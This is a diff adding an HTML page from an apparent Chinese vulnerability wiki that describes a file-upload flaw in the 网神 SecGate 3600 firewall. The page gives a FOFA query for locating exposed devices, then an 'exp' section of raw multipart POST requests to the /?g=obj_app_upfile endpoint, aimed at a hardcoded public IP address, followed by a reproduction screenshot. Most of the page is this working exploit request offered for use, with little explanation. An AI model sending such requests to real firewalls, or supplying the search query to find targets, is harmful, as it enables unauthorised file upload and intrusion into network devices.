@@ -1,0 +1,198 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  
+  
+    <meta charset="utf-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    
+    <meta name="author" content="内部使用">
+    <link rel="canonical" href="https://secnn.com/Web%E5%BA%94%E7%94%A8%E6%BC%8F%E6%B4%9E/%E7%BD%91%E7%A5%9E/%E7%BD%91%E7%A5%9E%E9%98%B2%E7%81%AB%E5%A2%99-app_av_import_save%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E/">
+    <link rel="shortcut icon" href="../../../favicon.ico">
+    
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=0" />
+    <title>网神防火墙 app av import save文件上传漏洞 - SecNN-Wiki漏洞库管理系统&网络安全知识库-本Wiki所有信息来源于公开漏洞数据库</title>
+    <link href="../../../css/bootstrap-3.3.7.min.css" rel="stylesheet">
+    <link href="../../../css/font-awesome-4.7.0.css" rel="stylesheet">
+    <link href="../../../css/base.css" rel="stylesheet">
+    <link rel="stylesheet" href="../../../css/highlight.css">
+    <!-- HTML5 shim and Respond.js IE8 support of HTML5 elements and media queries -->
+    <!--[if lt IE 9]>
+        <script src="https://oss.maxcdn.com/libs/html5shiv/3.7.0/html5shiv.js"></script>
+        <script src="https://oss.maxcdn.com/libs/respond.js/1.3.0/respond.min.js"></script>
+    <![endif]-->
+
+    <script src="../../../js/jquery-3.2.1.min.js"></script>
+    <script src="../../../js/bootstrap-3.3.7.min.js"></script>
+    <script src="../../../js/highlight.pack.js"></script>
+    
+    <base target="_top">
+    <script>
+      var base_url = '../../..';
+      var is_top_frame = false;
+        
+        var pageToc = [
+          {title: "\u7f51\u795e\u9632\u706b\u5899 app_av_import_save\u6587\u4ef6\u4e0a\u4f20\u6f0f\u6d1e", url: "#_top", children: [
+          ]},
+          {title: "fofa", url: "#fofa", children: [
+          ]},
+          {title: "exp", url: "#exp", children: [
+          ]},
+          {title: "\u6f0f\u6d1e\u590d\u73b0", url: "#_1", children: [
+          ]},
+        ];
+
+    </script>
+    <script src="../../../js/base.js"></script>
+      <script src="../../../search/main.js"></script> 
+</head>
+
+<body>
+<script>
+if (is_top_frame) { $('body').addClass('wm-top-page'); }
+</script>
+
+
+
+<div class="container-fluid wm-page-content">
+  <a name="_top"></a>
+    
+
+    
+    
+      
+    
+
+  <div class="row wm-article-nav-buttons" role="navigation" aria-label="navigation">
+    
+    <div class="wm-article-nav pull-right">
+      <a href="../%E7%BD%91%E7%A5%9ESecGata3600%E5%AE%89%E5%85%A8%E7%BD%91%E5%85%B3/%E7%BD%91%E7%A5%9ESecGata3600%E5%AE%89%E5%85%A8%E7%BD%91%E5%85%B3authManageSet.cgi%E6%8E%A5%E5%8F%A3%E7%99%BB%E5%BD%95%E7%BB%95%E8%BF%87%E6%BC%8F%E6%B4%9E/" class="btn btn-xs btn-default pull-right">
+        Next
+        <i class="fa fa-chevron-right" aria-hidden="true"></i>
+      </a>
+      <a href="../%E7%BD%91%E7%A5%9ESecGata3600%E5%AE%89%E5%85%A8%E7%BD%91%E5%85%B3/%E7%BD%91%E7%A5%9ESecGata3600%E5%AE%89%E5%85%A8%E7%BD%91%E5%85%B3authManageSet.cgi%E6%8E%A5%E5%8F%A3%E7%99%BB%E5%BD%95%E7%BB%95%E8%BF%87%E6%BC%8F%E6%B4%9E/" class="btn btn-xs btn-link">
+        网神SecGata 3600安全网关authManageSet.cgi 接口登录绕过漏洞
+      </a>
+    </div>
+    
+    <div class="wm-article-nav">
+      <a href="../%E7%BD%91%E7%A5%9E%E9%98%B2%E7%81%AB%E5%A2%99%20app_av_import_save%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E/" class="btn btn-xs btn-default pull-left">
+        <i class="fa fa-chevron-left" aria-hidden="true"></i>
+        Previous</a><a href="../%E7%BD%91%E7%A5%9E%E9%98%B2%E7%81%AB%E5%A2%99%20app_av_import_save%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E/" class="btn btn-xs btn-link">
+        网神防火墙 app av import save文件上传漏洞
+      </a>
+    </div>
+    
+  </div>
+
+    
+
+    <h2 id="app_av_import_save">网神防火墙 app_av_import_save文件上传漏洞<a class="headerlink" href="#app_av_import_save" title="Permanent link">&para;</a></h2>
+<h2 id="fofa">fofa<a class="headerlink" href="#fofa" title="Permanent link">&para;</a></h2>
+<div class="highlight"><pre><span></span><code>title=&quot;网神SecGate 3600防火墙&quot;
+</code></pre></div>
+<h2 id="exp">exp<a class="headerlink" href="#exp" title="Permanent link">&para;</a></h2>
+<div class="highlight"><pre><span></span><code>POST 
+HTTP/1.1
+User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/77.0.3865.90 Safari/537.36
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
+Accept-Language: zh-CN,zh;q=0.9
+Connection: close
+Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryJpMyThWnAxbcBBQc
+Cache-Control: no-cache
+Pragma: no-cache
+Host: 218.60.144.129
+Content-Length: 536
+
+------WebKitFormBoundaryJpMyThWnAxbcBBQc
+Content-Disposition: form-data; name=&quot;MAX_FILE_SIZE&quot;
+
+10000000
+------WebKitFormBoundaryJpMyThWnAxbcBBQc
+Content-Disposition: form-data; name=&quot;upfile&quot;; filename=&quot;test.txt&quot;
+Content-Type: text/plain
+
+test111
+------WebKitFormBoundaryJpMyThWnAxbcBBQc
+Content-Disposition: form-data; name=&quot;submit_post&quot;
+
+obj_app_upfile
+------WebKitFormBoundaryJpMyThWnAxbcBBQc
+Content-Disposition: form-data; name=&quot;__hash__&quot;
+
+0b9d6b1ab7479ab69d9f71b05e0e9445
+------WebKitFormBoundaryJpMyThWnAxbcBBQc--
+</code></pre></div>
+<div class="highlight"><pre><span></span><code>POST /?g=obj_app_upfile HTTP/1.1
+User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/77.0.3865.90 Safari/537.36
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
+Accept-Language: zh-CN,zh;q=0.9
+Connection: close
+Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryJpMyThWnAxbcBBQc
+Cache-Control: no-cache
+Pragma: no-cache
+Host: 218.60.144.129
+Content-Length: 536
+
+------WebKitFormBoundaryJpMyThWnAxbcBBQc
+Content-Disposition: form-data; name=&quot;MAX_FILE_SIZE&quot;
+
+10000000
+------WebKitFormBoundaryJpMyThWnAxbcBBQc
+Content-Disposition: form-data; name=&quot;upfile&quot;; filename=&quot;test.txt&quot;
+Content-Type: text/plain
+
+test111
+------WebKitFormBoundaryJpMyThWnAxbcBBQc
+Content-Disposition: form-data; name=&quot;submit_post&quot;
+
+obj_app_upfile
+------WebKitFormBoundaryJpMyThWnAxbcBBQc
+Content-Disposition: form-data; name=&quot;__hash__&quot;
+
+0b9d6b1ab7479ab69d9f71b05e0e9445
+------WebKitFormBoundaryJpMyThWnAxbcBBQc--
+</code></pre></div>
+<h2 id="_1">漏洞复现<a class="headerlink" href="#_1" title="Permanent link">&para;</a></h2>
+<p><img alt="" src="./assets/20231129204159.png" /></p>
+
+  <br>
+    
+
+    
+    
+      
+    
+
+  <div class="row wm-article-nav-buttons" role="navigation" aria-label="navigation">
+    
+    <div class="wm-article-nav pull-right">
+      <a href="../%E7%BD%91%E7%A5%9ESecGata3600%E5%AE%89%E5%85%A8%E7%BD%91%E5%85%B3/%E7%BD%91%E7%A5%9ESecGata3600%E5%AE%89%E5%85%A8%E7%BD%91%E5%85%B3authManageSet.cgi%E6%8E%A5%E5%8F%A3%E7%99%BB%E5%BD%95%E7%BB%95%E8%BF%87%E6%BC%8F%E6%B4%9E/" class="btn btn-xs btn-default pull-right">
+        Next
+        <i class="fa fa-chevron-right" aria-hidden="true"></i>
+      </a>
+      <a href="../%E7%BD%91%E7%A5%9ESecGata3600%E5%AE%89%E5%85%A8%E7%BD%91%E5%85%B3/%E7%BD%91%E7%A5%9ESecGata3600%E5%AE%89%E5%85%A8%E7%BD%91%E5%85%B3authManageSet.cgi%E6%8E%A5%E5%8F%A3%E7%99%BB%E5%BD%95%E7%BB%95%E8%BF%87%E6%BC%8F%E6%B4%9E/" class="btn btn-xs btn-link">
+        网神SecGata 3600安全网关authManageSet.cgi 接口登录绕过漏洞
+      </a>
+    </div>
+    
+    <div class="wm-article-nav">
+      <a href="../%E7%BD%91%E7%A5%9E%E9%98%B2%E7%81%AB%E5%A2%99%20app_av_import_save%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E/" class="btn btn-xs btn-default pull-left">
+        <i class="fa fa-chevron-left" aria-hidden="true"></i>
+        Previous</a><a href="../%E7%BD%91%E7%A5%9E%E9%98%B2%E7%81%AB%E5%A2%99%20app_av_import_save%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E/" class="btn btn-xs btn-link">
+        网神防火墙 app av import save文件上传漏洞
+      </a>
+    </div>
+    
+  </div>
+
+    <br>
+</div>
+
+<footer class="col-md-12 wm-page-content"><p>Copyright © 2025 SecNN-Wiki</p>
+  <p>Documentation built with <a href="http://www.mkdocs.org/">MkDocs</a> using <a href="None">Windmill Dark</a> theme by 内部使用 (noraj).</p>
+</footer>
+
+</body>
+</html>
